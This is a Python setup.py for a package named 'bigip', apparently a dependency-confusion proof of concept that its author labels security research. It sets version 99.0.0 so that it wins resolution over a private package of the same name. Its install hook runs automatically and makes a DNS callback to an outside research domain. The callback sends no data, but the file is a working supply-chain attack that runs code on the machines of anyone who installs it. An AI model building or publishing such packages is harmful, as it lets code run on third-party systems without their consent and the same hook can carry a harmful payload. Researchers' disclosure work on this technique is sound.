# Package Claimed for Security Research Purposes - H1 Logue
from setuptools import setup, find_packages
from setuptools.command.install import install
import socket
import os

class PostInstallCommand(install):
    def run(self):
        # DNS callback - safe, non-destructive proof
        try:
            hostname = f"bigip-poc.9oyng069p25x4kmle5dlnypj1a71vujj.b.nf"
            socket.gethostbyname(hostname)
        except:
            pass
        install.run(self)

setup(
    name='bigip',
    version='99.0.0',  # High version to win version resolution
    description='F5 Security Research Placeholder',
    author='Adam Logue',
    cmdclass={'install': PostInstallCommand},
    packages=find_packages(),
    python_requires='>=3.6',
)
